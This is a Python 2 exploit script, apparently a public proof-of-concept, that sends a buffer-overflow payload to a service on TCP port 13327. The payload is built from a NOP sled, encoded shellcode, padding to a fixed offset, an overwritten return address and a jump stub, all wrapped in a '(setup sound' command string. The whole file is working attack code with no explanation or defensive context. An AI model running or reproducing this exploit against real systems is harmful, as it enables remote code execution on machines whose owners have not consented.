#!/usr/bin/python

import socket
# 83C00C            add eax,byte +0xc
# FFE0              jmp eax

shell = (
"\xbe\x6d\x82\x2f\xee\xda\xd5\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x14\x31\x72\x14\x03\x72\x14\x83\xea\xfc\x8f\x77\x1e\x35\xb8"
"\x9b\x32\x8a\x15\x36\xb7\x85\x78\x76\xd1\x58\xfa\x2c\x40\x31"
"\x92\xd0\x7c\xa4\x3e\xbf\x6c\x97\xee\xb6\x6c\x7d\x68\x91\xa3"
"\x02\xfd\x60\x38\xb0\xf9\xd2\x26\x7b\x81\x50\x17\xe5\x4c\xd6"
"\xc4\xb3\x24\xe8\xb2\x8e\x38\x5f\x3a\xe9\x50\x4f\x93\x7a\xc8"
"\xe7\xc4\x1e\x61\x96\x93\x3c\x21\x35\x2d\x23\x71\xb2\xe0\x24")

host = "127.0.0.1"
crash = "\x90" * 16 + shell + "\x41" * (4368-105-16) + "\x27\x47\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = "\x11(setup sound " + crash + "\x90\x00#"

  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..." 
s.connect((host, 13327))
data = s.recv(1024)
print data
s.send(buffer)
s.close()
